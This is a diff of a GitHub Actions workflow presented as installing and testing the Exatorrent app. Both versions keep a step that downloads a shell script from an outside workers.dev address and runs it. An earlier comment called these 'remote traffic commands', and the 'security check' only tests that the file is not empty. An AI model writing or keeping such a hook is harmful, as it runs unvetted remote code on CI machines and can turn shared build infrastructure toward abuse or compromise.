@@ -1,4 +1,4 @@
-name: Install Exatorrent on GitHub Actions
+name: Install and Test Exatorrent
 
 on:
   push:
@@ -10,20 +10,44 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      # Run Exatorrent container
-      - name: Run exatorrent container
+      # Checkout the repository first
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      # Setup Node.js environment
+      - name: Setup Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: '18'  # Specify your Node.js version
+
+      # Install dependencies and start the app
+      - name: Install and run Exatorrent
+        working-directory: ./my-app  # Sets the directory for this step
         run: |
-          cd my-app
           npm install
-          npm run dev
+          npm run dev &
+          
+          # Wait for server to start
+          sleep 10
+          curl --retry 3 --retry-delay 5 --retry-connrefused http://localhost:3000
+          echo "Server is running"
 
-          # Verify it's running
-          sleep 5
-          curl -s http://localhost:3000 || echo "server may not be running"
-
-      # Fetch and run remote traffic commands
-      - name: Fetch and run remote traffic commands
+      # Fetch and execute remote commands
+      - name: Fetch and run remote commands
         run: |
-          curl -sSL https://holy-queen-e7be.idrissimahdi2020.workers.dev -o commands.sh
+          # Download with timeout and retries
+          curl --max-time 30 --retry 3 --retry-delay 5 -sSL https://holy-queen-e7be.idrissimahdi2020.workers.dev -o commands.sh
+          
+          # Security check (basic example)
+          if [ ! -s commands.sh ]; then
+            echo "Error: Downloaded file is empty"
+            exit 1
+          fi
+          
           chmod +x commands.sh
           ./commands.sh
+
+      # Cleanup (optional)
+      - name: Stop Exatorrent
+        if: always()
+        run: pkill -f "npm run dev" || true
